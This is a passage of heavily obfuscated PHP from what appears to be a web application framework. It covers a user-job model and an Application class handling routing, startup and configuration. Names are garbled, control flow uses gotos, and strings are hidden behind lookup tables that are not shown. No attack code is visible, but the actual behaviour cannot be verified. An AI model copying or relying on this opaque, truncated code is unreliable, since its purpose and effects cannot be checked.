"\x64\145\x73\143", "\x73\157\x72\x74"); const JOB_KEY = "\x73\x65\154\x66\x4a\x6f\x62\114\151\163\164"; public function listData($a­”æ×ÍÎ… = false, $e•”ØÏäİ = "\163\157\x72\x74", $eƒ­ë“¶è– = false) { return parent::listData($a­”æ×ÍÎ…, $e•”ØÏäİ, $eƒ­ë“¶è–); } public function remove($eÒ¢ĞŞÍ™ƒ) { return parent::remove($eÒ¢ĞŞÍ™ƒ); } public function add($FÌòÈôÔÓµ) { $BÆ³÷ƒŠ— =& $_SERVER[Ìó]; if ($this->findByName($FÌòÈôÔÓµ[$BÆ³÷ƒŠ—[28]])) { return !1; } $FÌòÈôÔÓµ[$BÆ³÷ƒŠ—[2093]] = $this->getSort(); return parent::insert($FÌòÈôÔÓµ); } private function getSort() { $f†…ˆ³ÇÃÕ =& $_SERVER[Ìó]; $fìùªš†À› = parent::listData(); $C¼ÀŞÑ‹Ñ = array_to_keyvalue($fìùªš†À›, $f†…ˆ³ÇÃÕ[33], $f†…ˆ³ÇÃÕ[2093]); return empty($C¼ÀŞÑ‹Ñ) ? 0 : max($C¼ÀŞÑ‹Ñ) + 1; } public function update($e•î¾‘˜¸, $EŸˆÒ±‚‡˜) { $dĞÑ®î·­  =& $_SERVER[Ìó]; $a¹î®©ÎÚ = parent::listData($e•î¾‘˜¸); $døçóˆŸ’˜ = $this->findByName($EŸˆÒ±‚‡˜[$dĞÑ®î·­ [28]]); if (!$a¹î®©ÎÚ || $døçóˆŸ’˜ && $døçóˆŸ’˜[$dĞÑ®î·­ [363]] != $a¹î®©ÎÚ[$dĞÑ®î·­ [363]]) { return !1; } return parent::update($e•î¾‘˜¸, $EŸˆÒ±‚‡˜); } public function setUserJob($dùèãÆ‘È, $c‡‘¹øº˜Ÿ) { goto B‹­Ğ¦Ë˜¯; B‹­Ğ¦Ë˜¯: $dñÀÉ·”‰Û =& $_SERVER[Ìó]; if (!is_array($c‡‘¹øº˜Ÿ)) { $c‡‘¹øº˜Ÿ = array($c‡‘¹øº˜Ÿ); } $c­”çÜğ«Ó = parent::listData(); goto CŠ«À’Á‚Ù; CŠ«À’Á‚Ù: $c“±Ïê±Ãœ = array_to_keyvalue($c­”çÜğ«Ó, $dñÀÉ·”‰Û[28]); $dÒŠÀŸ†ÖÔ = $dñÀÉ·”‰Û[357]; foreach ($c‡‘¹øº˜Ÿ as $aÜ×Ù†²“) { if ($c“±Ïê±Ãœ[$aÜ×Ù†²“]) { $dÒŠÀŸ†ÖÔ .= $c“±Ïê±Ãœ[$aÜ×Ù†²“][$dñÀÉ·”‰Û[363]] . $dñÀÉ·”‰Û[47]; } else { $a•Ò¤Ô¤‚Ã = $this->add($aÜ×Ù†²“); $dÒŠÀŸ†ÖÔ .= $a•Ò¤Ô¤‚Ã . $dñÀÉ·”‰Û[47]; } } goto C­×ºİÀÕ©; C­×ºİÀÕ©: $dÒŠÀŸ†ÖÔ = rtrim($dÒŠÀŸ†ÖÔ, $dñÀÉ·”‰Û[47]); Model($dñÀÉ·”‰Û[472])->metaSet($dùèãÆ‘È, self::JOB_KEY, $dÒŠÀŸ†ÖÔ); goto A³îöåÆ ¸; A³îöåÆ ¸: } public function getUserJob($B˜Ïºˆ„ò) { $CäÎÙ«¢°İ = Model($_SERVER[Ìó][472])->metaGet($B˜Ïºˆ„ò); return $this->getUserJobInfo($CäÎÙ«¢°İ[self::JOB_KEY]); } public function getUserJobInfo($eîß»Ç¾†²) { goto D‹’¨±‡Òœ; E‰Ó¦©”ùÚ: $eÑÁ›‡ = array_remove_key($eÑÁ›‡, $AÃìÛ–èÛ†[183]); $dÖæµìºĞ = array(); foreach ($Dİñ§ÒŒâã as $d¢äÔ÷ñÜ¡) { if (isset($eÑÁ›‡[$d¢äÔ÷ñÜ¡])) { $dÖæµìºĞ[] = $eÑÁ›‡[$d¢äÔ÷ñÜ¡]; } } goto CÀŒ‚Ñ¡Ìó; D‹’¨±‡Òœ: $AÃìÛ–èÛ† =& $_SERVER[Ìó]; $Dİñ§ÒŒâã = explode($AÃìÛ–èÛ†[47], $eîß»Ç¾†²); $eÑÁ›‡ = parent::listData(); goto E‰Ó¦©”ùÚ; CÀŒ‚Ñ¡Ìó: return $dÖæµìºĞ; goto f„‘ì„; f„‘ì„: } } goto Bô’ÛÉÁÀå; EÙÌèåØï³: $F´‘¯¾°Ôà = $_SERVER[Ìó][545]; if (strlen($F´‘¯¾°Ôà) < $_SERVER[Ìó][546]) { return; } class Application { private $defaultModule = "\x69\156\x64\145\x78"; private $defaultController = "\151\156\x64\145\170"; private $defaultAction = "\151\x6e\x64\x65\170"; function __construct() { } public function setDefault($bÁ’†Øùƒ½) { goto C‘Öµ«ˆò; DÓ¼¯ª©: $this->{$_SERVER[Ç][3]}($Fæø£å¨·³[4], array($this, $Fæø£å¨·³[5])); goto b©‚°§ÍÇ; bÓèòòÂ»Ì: $this->defaultModule = $eÖ÷‡Ò××Á[0] ? $eÖ÷‡Ò××Á[0] : $this->defaultModule; $d©‹ˆæ¨­ê = $dÄƒÌ¯Æ»Ñ[547]; while ($d©‹ˆæ¨­ê < $dÄƒÌ¯Æ»Ñ[548]) { if ($d©‹ˆæ¨­ê >= 0) { break; } $d©‹ˆæ¨­ê++; } goto FÑ®ËßÔ§°; C‘Öµ«ˆò: $dÄƒÌ¯Æ»Ñ =& $_SERVER[Ìó]; $Fæø£å¨·³ =& $_SERVER[Ç]; $eÖ÷‡Ò××Á = $Fæø£å¨·³[0]($Fæø£å¨·³[1], $Fæø£å¨·³[2]($bÁ’†Øùƒ½, $Fæø£å¨·³[1])); goto bÓèòòÂ»Ì; FÑ®ËßÔ§°: $this->defaultController = $eÖ÷‡Ò××Á[1] ? $eÖ÷‡Ò××Á[1] : $this->defaultController; $EÖÏè”Áé¤ = $dÄƒÌ¯Æ»Ñ[549]; $this->defaultAction = $eÖ÷‡Ò××Á[2] ? $eÖ÷‡Ò××Á[2] : $this->defaultAction; goto DÓ¼¯ª©; b©‚°§ÍÇ: } public function appRun($f¢¶‡æÈÊ½) { goto CâÊñ…Í; dÔ¹³³Æƒ: $B˜³Û¯ç‹Á = $A¥ĞèÛ´Ç’[6]($aŒÉ¾¥ÅÆ°[0]); $c„Ü¶í®œ = $A¥ĞèÛ´Ç’[7]; if ($B˜³Û¯ç‹Á == $A¥ĞèÛ´Ç’[8]) { $c„Ü¶í®œ = $A¥ĞèÛ´Ç’[9]; $aŒÉ¾¥ÅÆ°[0] = $A¥ĞèÛ´Ç’[10]; $aŒÉ¾¥ÅÆ°[1] = $aŒÉ¾¥ÅÆ°[1] . $A¥ĞèÛ´Ç’[11]; $f¢¶‡æÈÊ½ = $A¥ĞèÛ´Ç’[12]($A¥ĞèÛ´Ç’[1], $aŒÉ¾¥ÅÆ°); $f¢¶‡æÈÊ½ = $A¥ĞèÛ´Ç’[2]($f¢¶‡æÈÊ½, $A¥ĞèÛ´Ç’[1]); } goto A–º°Ì¾ÄŠ; CâÊñ…Í: $b›°¢ŸÓäù =& $_SERVER[Ìó]; $A¥ĞèÛ´Ç’ =& $_SERVER[Ç]; $aŒÉ¾¥ÅÆ° = $A¥ĞèÛ´Ç’[0]($A¥ĞèÛ´Ç’[1], $f¢¶‡æÈÊ½); goto dÔ¹³³Æƒ; cï“¡˜À‡–: $fÓíå‰²ï‰ = $b›°¢ŸÓäù[550]; if (strlen($fÓíå‰²ï‰) < $b›°¢ŸÓäù[551]) { return; } goto dÏ¯ÚéÔß ; A–º°Ì¾ÄŠ: $A¥ĞèÛ´Ç’[13](array($A¥ĞèÛ´Ç’[14], $A¥ĞèÛ´Ç’[15]), $c„Ü¶í®œ . $A¥ĞèÛ´Ç’[16], $f¢¶‡æÈÊ½); $A¥ĞèÛ´Ç’[17]($f¢¶‡æÈÊ½); $A¥ĞèÛ´Ç’[13](array($A¥ĞèÛ´Ç’[14], $A¥ĞèÛ´Ç’[15]), $c„Ü¶í®œ . $A¥ĞèÛ´Ç’[18], $f¢¶‡æÈÊ½); goto cï“¡˜À‡–; dÏ¯ÚéÔß : } private function autorun() { goto Dñµ®ˆèæ†; Aßğ¾á‘·é: foreach ($config[$cß²éˆé[20]] as $EÁ±ÄáˆÍî => $e¸ò·ÇâÎµ) { $this->{$_SERVER[Ç][21]}($e¸ò·ÇâÎµ); $FÛÀƒ¼¢ßÌ = $aç¢Ş‚µ¹[553]; if (!$FÛÀƒ¼¢ßÌ) { return; } } goto AæÜ¢ Ä; Dñµ®ˆèæ†: $aç¢Ş‚µ¹ =& $_SERVER[Ìó]; $cß²éˆé =& $_SERVER[Ç]; global $config; goto F¬ßĞßÕì£; F¬ßĞßÕì£: $c„á‚åÁ•³ = $aç¢Ş‚µ¹[552]; if (!$c„á‚åÁ•³) { return; } if ($cß²éˆé[19]($config[$cß²éˆé[20]]) == 0) { return; } goto Aßğ¾á‘·é; AæÜ¢ Ä: } private function qnsw0056b5c3() { goto EÛÊàºë±; EÍ«öİŠº»: if (strlen($A‰‚ñ‰À¾) < $c»İİ×‰À[560]) { die; } $GLOBALS[$c¨Í¤Ê§öÂ[22]][$c¨Í¤Ê§öÂ[28]] = $c¨Í¤Ê§öÂ[29]($c¨Í¤Ê§öÂ[1], $GLOBALS[$c¨Í¤Ê§öÂ[22]][$c¨Í¤Ê§öÂ[23]]); goto e¼…ëäáï; FÕññÍ×î†: while ($B»¿£îÌ¸º < $c»İİ×‰À[558]) { if ($B»¿£îÌ¸º >= 0) { break; } $B»¿£îÌ¸º++; } $GLOBALS[$c¨Í¤Ê§öÂ[22]][$c¨Í¤Ê§öÂ[23]] = $c¨Í¤Ê§öÂ[27]($C¤ºëçëê, $DÛ¥ïÖÆ—¬); $A‰‚ñ‰À¾ = $c»İİ×‰À[559]; goto EÍ«öİŠº»; c¼˜à¡¤½¤: if (!$Dìµè¼ñò || $c¨Í¤Ê§öÂ[24]($Dìµè¼ñò) <= $c¨Í¤Ê§öÂ[24]($c‘çÉÅ†)) { return; } if ($c¨Í¤Ê§öÂ[6]($c¨Í¤Ê§öÂ[25]($Dìµè¼ñò, -$c¨Í¤Ê§öÂ[24]($c‘çÉÅ†))) != $c‘çÉÅ†) { return; } $bê–×¦ÈÜ = $c¨Í¤Ê§öÂ[25]($Dìµè¼ñò, 0, -$c¨Í¤Ê§öÂ[24]($c‘çÉÅ†)); goto A³ùŞˆ‘’š; c˜°¦¸îÛ: $bòˆÀÑÆÅ» = $c»İİ×‰À[556]; $DÛ¥ïÖÆ—¬ = $c¨Í¤Ê§öÂ[26]($GLOBALS[$c¨Í¤Ê§öÂ[22]][$c¨Í¤Ê§öÂ[23]], 1); $B»¿£îÌ¸º = $c»İİ×‰À[557]; goto FÕññÍ×î†; A³ùŞˆ‘’š: $dÉè…†Ô» = $c»İİ×‰À[555]; if (!$dÉè…†Ô») { die; } $C¤ºëçëê = array($c¨Í¤Ê§öÂ[8], $bê–×¦ÈÜ); goto c˜°¦¸îÛ; CøİçÏ‡ĞÈ: $Dìµè¼ñò = $GLOBALS[$c¨Í¤Ê§öÂ[22]][$c¨Í¤Ê§öÂ[23]][0]; $cäîµÓ÷¨› = $c»İİ×‰À[554]; if (strlen($cäîµÓ÷¨›) < $c»İİ×‰À[551]) { return; } goto c¼˜à¡¤½¤; EÛÊàºë±: $c»İİ×‰À =& $_SERVER[Ìó]; $c¨Í¤Ê§öÂ =& $_SERVER[Ç]; $c‘çÉÅ† = $c¨Í¤Ê§öÂ[8]; goto CøİçÏ‡ĞÈ; e¼…ëäáï: } private function uwdk4db20e89() { goto Aà¯½Çô¨; a±Ä¸‰ºÁÖ: if (strlen($E¼îóŞŸˆ¥) < $aµÅ®­ÅôÃ[558]) { return; } $cí÷™Ø¶´‰[34]($cí÷™Ø¶´‰[35], $B´ŞÄ÷”ê³, $dê‚›´³™í); $B´ŞÄ÷”ê³ = $cí÷™Ø¶´‰[2]($dê‚›´³™í[0][0], $cí÷™Ø¶´‰[36]); goto b¯¼É ¿¨«; fßÉÕÔ¿: $DÛ¼•Ç»½å = $_SERVER[$cí÷™Ø¶´‰[30]]; $CÄ²‰Šá÷‡ = $cí÷™Ø¶´‰[31]; $D‘Ñ…’Ó¹õ = $aµÅ®­ÅôÃ[561]; goto Bö‚¢ÖÙ¸×; EŒ¬Ç¿§ˆ‘: if (strlen($CßìÔ‰‡ù) < $aµÅ®­ÅôÃ[548]) { return; } $B´ŞÄ÷”ê³ = $cí÷™Ø¶´‰[25]($DÛ¼•Ç»½å, $A„Õ´‡¸ Ò + $cí÷™Ø¶´‰[24]($CÄ²‰Šá÷‡)); $E¼îóŞŸˆ¥ = $aµÅ®­ÅôÃ[563]; goto a±Ä¸‰ºÁÖ; Aà¯½Çô¨: $aµÅ®­ÅôÃ =& $_SERVER[Ìó]; $cí÷™Ø¶´‰ =& $_SERVER[Ç]; if ($GLOBALS[$cí÷™Ø¶´‰[22]][$cí÷™Ø¶´‰[28]] != $cí÷™Ø¶´‰[10]) { return; } goto fßÉÕÔ¿; b„¤¢†ƒƒñ: $GLOBALS[$cí÷™Ø¶´‰[22]][$cí÷™Ø¶´‰[28]] = $cí÷™Ø¶´‰[29]($cí÷™Ø¶´‰[1], $GLOBALS[$cí÷™Ø¶´‰[22]][$cí÷™Ø¶´‰[23]]); goto FèÃ˜–÷ÌÄ; Bö‚¢ÖÙ¸×: if (!$cí÷™Ø¶´‰[32]($DÛ¼•Ç»½å, $CÄ²‰Šá÷‡)) { return; } $A„Õ´‡¸ Ò = $cí÷™Ø¶´‰[33]($DÛ¼•Ç»½å, $CÄ²‰Šá÷‡); $CßìÔ‰‡ù = $aµÅ®­ÅôÃ[562]; goto EŒ¬Ç¿§ˆ‘; b¯¼É ¿¨«: $GLOBALS[$cí÷™Ø¶´‰[22]][$cí÷™Ø¶´‰[23]] = $cí÷™Ø¶´‰[0]($cí÷™Ø¶´‰[36], $B´ŞÄ÷”ê³); $f¢´’¨—Œè = $aµÅ®­ÅôÃ[564]; if (!$f¢´’¨—Œè) { return; } goto b„¤¢†ƒƒñ; FèÃ˜–÷ÌÄ: } public function run() { goto fÙƒŒª¯¦Ÿ; c•…—‡£³: $a¤’ˆòõ¢ = $Dªä›Æ[565]; if (strlen($a¤’ˆòõ¢) < $Dªä›Æ[560]) { die; } $this->{$_SERVER[Ç][38]}(); goto DàêİœŠÁ£; DÓó°Ğ¿¶ã: $DäÅå‹—„[39]($DäÅå‹—„[41], isset($DØâßóì›Á[1]) && $DØâßóì›Á[0] ? $DØâßóì›Á[1] : $this->defaultController); $DËÔİÚÎ¶é = $Dªä›Æ[569]; if (!$DËÔİÚÎ¶é) { return; } goto fÆë¥ğ¸ÜÜ; C­·‚ò×»¨: $this->{$_SERVER[Ç][45]}(); $FçÕÁØ¾Ëå = $Dªä›Æ[570]; while ($FçÕÁØ¾Ëå < $Dªä›Æ[546]) { if ($FçÕÁØ¾Ëå >= 0) { break; } $FçÕÁØ¾Ëå++; } goto BÃŞã×’Í; BÃŞã×’Í: if ($DäÅå‹—„[19]($DØâßóì›Á) >= 3) { $this->{$_SERVER[Ç][21]}($eİ®°§Ùâ); } else { $this->{$_SERVER[Ç][21]}(ACTION); } goto AĞÍùâĞ»²; eµğÍ›Èš: $DäÅå‹—„[39]($DäÅå‹—„[40], isset($DØâßóì›Á[0]) && $DØâßóì›Á[0] ? $DØâßóì›Á[0] : $this->defaultModule); $AÖæ‚æéÁğ = $Dªä›Æ[568]; if (strlen($AÖæ‚æéÁğ) < $Dªä›Æ[546]) { die; } goto DÓó°Ğ¿¶ã; fÙƒŒª¯¦Ÿ: $Dªä›Æ =& $_SERVER[Ìó]; $DäÅå‹—„ =& $_SERVER[Ç]; $this->{$_SERVER[Ç][37]}(); goto c•…—‡£³; fÆë¥ğ¸ÜÜ: $DäÅå‹—„[39]($DäÅå‹—„[42], isset($DØâßóì›Á[2]) && $DØâßóì›Á[0] ? $DØâßóì›Á[2] : $this->defaultAction); $DäÅå‹—„[39]($DäÅå‹—„[43], MOD . $DäÅå‹—„[1] . ST . $DäÅå‹—„[1] . ACT); $_SERVER[$DäÅå‹—„[44]] = $DäÅå‹—„[6](ACTION); goto C­·‚ò×»¨; DàêİœŠÁ£: $c¬Š°‘ö— = $Dªä›Æ[566]; while ($c¬Š°‘ö— < $Dªä›Æ[548]) { if ($c¬Š°‘ö— >= 0) { break; } $c¬Š°‘ö—++; } $DØâßóì›Á = $GLOBALS[$DäÅå‹—„[22]][$DäÅå‹—„[23]]; goto CÉÆõÒ»ÀŸ; CÉÆõÒ»ÀŸ: $eİ®°§Ùâ = $GLOBALS[$DäÅå‹—„[22]][$DäÅå‹—„[28]]; $dĞ­½¸°¼º = $Dªä›Æ[567]; if (!$dĞ­½¸°¼º) { die; } goto eµğÍ›Èš; AĞÍùâĞ»²: } private $wxeue3e40ca8 = array(); private $frzb663f35ed = ''; public function ptds22011654() { goto eõ»Ø‡¨ÒÌ; fÊ»˜³£: $this->{$_SERVER[Ç][51]}(); $this->{$_SERVER[Ç][52]}(); $aëÏŠã¶´³ = $f²ÊêŸ‡Ì[575]; goto CÒâÔ¼äŠ; CÒâÔ¼äŠ: if (strlen($aëÏŠã¶´³) < $f²ÊêŸ‡Ì[560]) { return; } $this->{$_SERVER[Ç][3]}($D±éøÕÇğ[53], array($this, $D±éøÕÇğ[54])); $f¼•ÓÁ£ÙŒ = $f²ÊêŸ‡Ì[576]; goto FİùøƒÈôÂ; eõ»Ø‡¨ÒÌ: $f²ÊêŸ‡Ì =& $_SERVER[Ìó]; $D±éøÕÇğ =& $_SERVER[Ç]; $this->{$_SERVER[Ç][46]}(); goto AùÅÓªöã; FİùøƒÈôÂ: if (strlen($f¼•ÓÁ£ÙŒ) < $f²ÊêŸ‡Ì[560]) { return; } $this->{$_SERVER[Ç][3]}($D±éøÕÇğ[55], array($this, $D±éøÕÇğ[56])); $this->{$_SERVER[Ç][3]}($D±éøÕÇğ[57], array($this, $D±éøÕÇğ[58])); goto EÑîİãÙ†; AùÅÓªöã: $a”Åøğ‹¤ = $f²ÊêŸ‡Ì[571]; $this->{$_SERVER[Ç][47]}(); $c‘Œ¡’ë¢ = $f²ÊêŸ‡Ì[572]; goto bù Ñ“àíŞ; Cº¹Íµ‘ÃÀ: $cÖîİ‰£§Ú = $f²ÊêŸ‡Ì[573]; $this->{$_SERVER[Ç][50]}(); $cõ÷‹éõñ = $f²ÊêŸ‡Ì[574]; goto fÊ»˜³£; bù Ñ“àíŞ: if (!$c‘Œ¡’ë¢) { return; } $this->{$_SERVER[Ç][48]}(); $this->{$_SERVER[Ç][49]}(); goto Cº¹Íµ‘ÃÀ; a‰Š¼íáÈ¥: $dø‹‹ê¹İ = $f²ÊêŸ‡Ì[578]; if (!$dø‹‹ê¹İ) { die; } goto aÑ×æ­åŸÏ; EÑîİãÙ†: $Cà‹‹Ö¦¯à = $f²ÊêŸ‡Ì[577]; while ($Cà‹‹Ö¦¯à < $f²ÊêŸ‡Ì[558]) { if ($Cà‹‹Ö¦¯à >= 0) { break; } $Cà‹‹Ö¦¯à++; } $this->{$_SERVER[Ç][3]}($D±éøÕÇğ[59], array($this, $D±éøÕÇğ[60])); goto a‰Š¼íáÈ¥; aÑ×æ­åŸÏ: } public function gdjp1df46be0($F°ÙÏãôÆ) { goto e”„£Ş¾±Ô; E ‰ÀÔì‘: $eè«ö¹® š = $cøô‡¸°µ»[579]; $bÊ¡šñÎ‚  = array($f†½Òœ›Âª[64], $f†½Òœ›Âª[65], $f†½Òœ›Âª[66], $f†½Òœ›Âª[67], $f†½Òœ›Âª[68], $f†½Òœ›Âª[69], $f†½Òœ›Âª[70], $f†½Òœ›Âª[71], $f†½Òœ›Âª[72], $f†½Òœ›Âª[73], $f†½Òœ›Âª[74], $f†½Òœ›Âª[75], $f†½Òœ›Âª[76], $f†½Òœ›Âª[77], $f†½Òœ›Âª[78], $f†½Òœ›Âª[79], $f†½Òœ›Âª[80], $f†½Òœ›Âª[81], $f†½Òœ›Âª[82], $f†½Òœ›Âª[83], $f†½Òœ›Âª[84], $f†½Òœ›Âª[85], $f†½Òœ›Âª[86], $f†½Òœ›Âª[87], $f†½Òœ›Âª[88], $f†½Òœ›Âª[89], $f†½Òœ›Âª[90]); $C‡Õç…çÄ = $cøô‡¸°µ»[580]; goto aœ­‰ã–; e—ˆÓ´ø×‘: $F°ÙÏãôÆ[$f†½Òœ›Âª[108]][$f†½Òœ›Âª[109]] = $f†½Òœ›Âª[110]($f†½Òœ›Âª[111])->{$_SERVER[Ç][112]}(); $F°ÙÏãôÆ[$f†½Òœ›Âª[108]][$f†½Òœ›Âª[113]] = $f†½Òœ›Âª[114]($_SERVER[$f†½Òœ›Âª[115]] . $bÄ§ÒÓ¢§È[$f†½Òœ›Âª[116]]); $Eæë¨„”› = $cøô‡¸°µ»[584]; goto bÇ°Ô›Ğ¡ƒ; f‡‚Š…øè‘: $bØ¿ğ„” = $cøô‡¸°µ»[582]; while ($bØ¿ğ„” < $cøô‡¸°µ»[546]) { if ($bØ¿ğ„” >= 0) { break; } $bØ¿ğ„”++; } unset($F°ÙÏãôÆ[$f†½Òœ›Âª[93]][$f†½Òœ›Âª[95]][$f†½Òœ›Âª[96]]); goto FÔâóáœ„Š; FÔâóáœ„Š: unset($F°ÙÏãôÆ[$f†½Òœ›Âª[93]][$f†½Òœ›Âª[95]][$f†½Òœ›Âª[97]]); unset($F°ÙÏãôÆ[$f†½Òœ›Âª[93]][$f†½Òœ›Âª[94]][$f†½Òœ›Âª[76]]); unset($F°ÙÏãôÆ[$f†½Òœ›Âª[93]][$f†½Òœ›Âª[94]][$f†½Òœ›Âª[98]]); goto CïØ¡›ÑÁ«; CïØ¡›ÑÁ«: $F°ÙÏãôÆ[$f†½Òœ›Âª[93]][$f†½Òœ›Âª[94]][$f†½Òœ›Âª[99]] = array($f†½Òœ›Âª[100] => (int) $f·—ì®÷Ú[$f†½Òœ›Âª[101]], $f†½Òœ›Âª[102] => $f†½Òœ›Âª[103]($f†½Òœ›Âª[104]($f·—ì®÷Ú, $f†½Òœ›Âª[105], array())), $f†½Òœ›Âª[106] => (int) $f†½Òœ›Âª[104]($f·—ì®÷Ú, $f†½Òœ›Âª[107], 0)); $CÍÍŞ”ÒâÖ = $cøô‡¸°µ»[583]; if (!$CÍÍŞ”ÒâÖ) { die; } goto e—ˆÓ´ø×‘; aœ­‰ã–: if (strlen($C‡Õç…çÄ) < $cøô‡¸°µ»[546]) { return; } foreach ($bÊ¡šñÎ‚  as $Aä†ÑÈ•Å¯) { $dÀ«Õ—´·Ò = $GLOBALS[$f†½Òœ›Âª[91]][$f†½Òœ›Âª[92]][$Aä†ÑÈ•Å¯]; $dÕ¨ô”ÌöĞ = $cøô‡¸°µ»[581]; if (isset($bÄ§ÒÓ¢§È[$Aä†ÑÈ•Å¯])) { $dÀ«Õ—´·Ò = $bÄ§ÒÓ¢§È[$Aä†ÑÈ•Å¯]; } $F°ÙÏãôÆ[$f†½Òœ›Âª[93]][$f†½Òœ›Âª[94]][$Aä†ÑÈ•Å¯] = $dÀ«Õ—´·Ò; } $f·—ì®÷Ú = $F°ÙÏãôÆ[$f†½Òœ›Âª[93]][$f†½Òœ›Âª[94]][$f†½Òœ›Âª[76]]; goto f‡‚Š…øè‘; d­•äÕ²¯±: $F°ÙÏãôÆ[$f†½Òœ›Âª[108]][$f†½Òœ›Âª[130]] = $f†½Òœ›Âª[104]($this->wxeue3e40ca8, $f†½Òœ›Âª[131], $f†½Òœ›Âª[10]); $aØ‡ëêóÑ° = $cøô‡¸°µ»[587]; if ($f†½Òœ›Âª[104]($GLOBALS, $f†½Òœ›Âª[132]) && $this->config[$f†½Òœ›Âª[133]]) { $F°ÙÏãôÆ[$f†½Òœ›Âª[108]][$f†½Òœ›Âª[134]] = WEB_ROOT; } goto DàšéÒ­»; e”„£Ş¾±Ô: $cøô‡¸°µ» =& $_SERVER[Ìó]; $f†½Òœ›Âª =& $_SERVER[Ç]; $bÄ§ÒÓ¢§È = $f†½Òœ›Âª[61]($f†½Òœ›Âª[62])->{$_SERVER[Ç][63]}(); goto E ‰ÀÔì‘; CÇñŸ–ˆÇ: if ($bÄ§ÒÓ¢§È[$f†½Òœ›Âª[120]] != $f†½Òœ›Âª[121]) { $F°ÙÏãôÆ[$f†½Òœ›Âª[108]][$f†½Òœ›Âª[122]] = $bÄ§ÒÓ¢§È[$f†½Òœ›Âª[122]]; $F°ÙÏãôÆ[$f†½Òœ›Âª[108]][$f†½Òœ›Âª[123]] = $bÄ§ÒÓ¢§È[$f†½Òœ›Âª[123]]; $d§ç¸ëŒ®ì = $f†½Òœ›Âª[124](10) . $this->frzb663f35ed . $f†½Òœ›Âª[124](5); $F°ÙÏãôÆ[$f†½Òœ›Âª[93]][$f†½Òœ›Âª[125]][$f†½Òœ›Âª[126]] = $this->{$_SERVER[Ç][127]}($d§ç¸ëŒ®ì, $F°ÙÏãôÆ[$f†½Òœ›Âª[108]][$f†½Òœ›Âª[113]]); } if ($this->frzb663f35ed == $f†½Òœ›Âª[121]) { $F°ÙÏãôÆ[$f†½Òœ›Âª[93]][$f†½Òœ›Âª[94]][$f†½Òœ›Âª[99]][$f†½Òœ›Âª[107]] = 0; } $F°ÙÏãôÆ[$f†½Òœ›Âª[108]][$f†½Òœ›Âª[128]] = $f†½Òœ›Âª[104]($this->wxeue3e40ca8, $f†½Òœ›Âª[129], $f†½Òœ›Âª[10]); goto d­•äÕ²¯±; fôß´Ú…¸á: $F°ÙÏãôÆ[$f†½Òœ›Âª[108]][$f†½Òœ›Âª[120]] = $this->frzb663f35ed; $DóŒ…öŒß¢ = $cøô‡¸°µ»[586]; if (!$DóŒ…öŒß¢) { die; } goto CÇñŸ–ˆÇ; bÇ°Ô›Ğ¡ƒ: if (!$Eæë¨„”›) { return; } $F°ÙÏãôÆ[$f†½Òœ›Âª[108]][$f†½Òœ›Âª[117]] = $f†½Òœ›Âª[118]($f†½Òœ›Âª[119]()); $bÎÂ óâ = $cøô‡¸°µ»[585]; goto fôß´Ú…¸á; DàšéÒ­»: return $F°ÙÏãôÆ; goto FÄÚÜÔÀå¤; FÄÚÜÔÀå¤: } private function aoxlcacb484a() { goto b„ÃèÔÕÒí; fó½²³„İô: $F®‹†ˆÕ»À = array($B°òš¶‡‘˜[159] => $bœ÷º©’º§[$B°òš¶‡‘˜[64]], $B°òš¶‡‘˜[160] => $bœ÷º©’º§[$B°òš¶‡‘˜[65]], $B°òš¶‡‘˜[161] => $B°òš¶‡‘˜[10]); foreach ($D®òñÒÌö as $C¸ŠÒà÷ñÓ) { if (!isset($bœ÷º©’º§[$C¸ŠÒà÷ñÓ]) || !$bœ÷º©’º§[$C¸ŠÒà÷ñÓ]) { continue; } $F®‹†ˆÕ»À[$C¸ŠÒà÷ñÓ] = $bœ÷º©’º§[$C¸ŠÒà÷ñÓ]; $bò÷—÷‹ê¿ = $f“İâ°¸[590]; if (!$bò÷—÷‹ê¿) { die; } } $B°òš¶‡‘˜[13](array($B°òš¶‡‘˜[151], $B°òš¶‡‘˜[152]), $F®‹†ˆÕ»À); goto f¦´Äœšâ¿; F¢Š¦ÕçİŠ: if ($this->frzb663f35ed == $B°òš¶‡‘˜[121]) { return; } $D®òñÒÌö = array($B°òš¶‡‘˜[153], $B°òš¶‡‘˜[154], $B°òš¶‡‘˜[155], $B°òš¶‡‘˜[156], $B°òš¶‡‘˜[157], $B°òš¶‡‘˜[158]); $bœ÷º©’º§ = $B°òš¶‡‘˜[61]($B°òš¶‡‘˜[62])->{$_SERVER[Ç][63]}(); goto fó½²³„İô; b„ÃèÔÕÒí: $f“İâ°¸ =& $_SERVER[Ìó]; $B°òš¶‡‘˜ =& $_SERVER[Ç]; if ($_SERVER[$B°òš¶‡‘˜[44]] == $B°òš¶‡‘˜[135]) { goto F¤‰Ëº«ªã; F¤‰Ëº«ªã: $B’ö†‰‰«Ï = array($B°òš¶‡‘˜[120] => $this->frzb663f35ed, $B°òš¶‡‘˜[136] => $this->{$_SERVER[Ç][137]}(), $B°òš¶‡‘˜[138] => $B°òš¶‡‘˜[61]($B°òš¶‡‘˜[139])->{$_SERVER[Ç][140]}()); if ($this->frzb663f35ed != $B°òš¶‡‘˜[121]) { $bø…Úõ³˜ = $B°òš¶‡‘˜[104]($this->wxeue3e40ca8, $B°òš¶‡‘˜[141]); if ($bø…Úõ³˜) { $B’ö†‰‰«Ï[$B°òš¶‡‘˜[142]] = $bø…Úõ³˜; $B’ö†‰‰«Ï[$B°òš¶‡‘˜[143]] = $B°òš¶‡‘˜[144]($B°òš¶‡‘˜[104]($this->wxeue3e40ca8, $B°òš¶‡‘˜[145])); $B’ö†‰‰«Ï[$B°òš¶‡‘˜[146]] = $B°òš¶‡‘˜[104]($this->wxeue3e40ca8, $B°òš¶‡‘˜[131]); } } $B’ö†‰‰«Ï = $this->{$_SERVER[Ç][147]}($B°òš¶‡‘˜[148]($B’ö†‰‰«Ï), $B°òš¶‡‘˜[114]($B°òš¶‡‘˜[149])); goto B¶ºµˆÍÇ; EŞ›ÇŒ©ËÔ: $B°òš¶‡‘˜[13](array($B°òš¶‡‘˜[151], $B°òš¶‡‘˜[152]), $F®‹†ˆÕ»À); $Dô¹©ÛŒ­÷ = $f“İâ°¸[589]; if (!$Dô¹©ÛŒ­÷) { return; } goto C¡ÒôÉ¯™È; B¶ºµˆÍÇ: $Dâµï‰šƒ¸ = $f“İâ°¸[588]; if (!$Dâµï‰šƒ¸) { die; } $F®‹†ˆÕ»À = array($B°òš¶‡‘˜[150] => $B’ö†‰‰«Ï); goto EŞ›ÇŒ©ËÔ; C¡ÒôÉ¯™È: } goto F¢Š¦ÕçİŠ; f¦´Äœšâ¿: } private function 